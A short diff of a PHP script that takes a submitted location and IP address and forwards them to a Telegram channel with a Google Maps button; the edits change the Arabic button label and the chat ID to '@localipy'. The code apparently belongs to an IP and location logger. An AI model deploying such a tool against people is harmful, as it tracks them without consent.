@@ -15,7 +15,7 @@ if(isset($_POST['location']) && isset($_POST['ip'])) {
     $keyboard = array(
         array(
             array(
-                'text' => 'فتح الموقع',
+                'text' => 'فتح الموقع في خرائط جوجل',
                 'url' => 'https://www.google.com/maps/search/?api=1&query=' . urlencode($location)
             )
         ),
@@ -33,7 +33,7 @@ if(isset($_POST['location']) && isset($_POST['ip'])) {
 
     // Send the message to the Telegram bot with the inline keyboard
     $post_fields = array(
-        'chat_id' => '373715044',
+        'chat_id' => '@localipy',
         'text' => $message,
         'reply_markup' => $reply_markup
     );
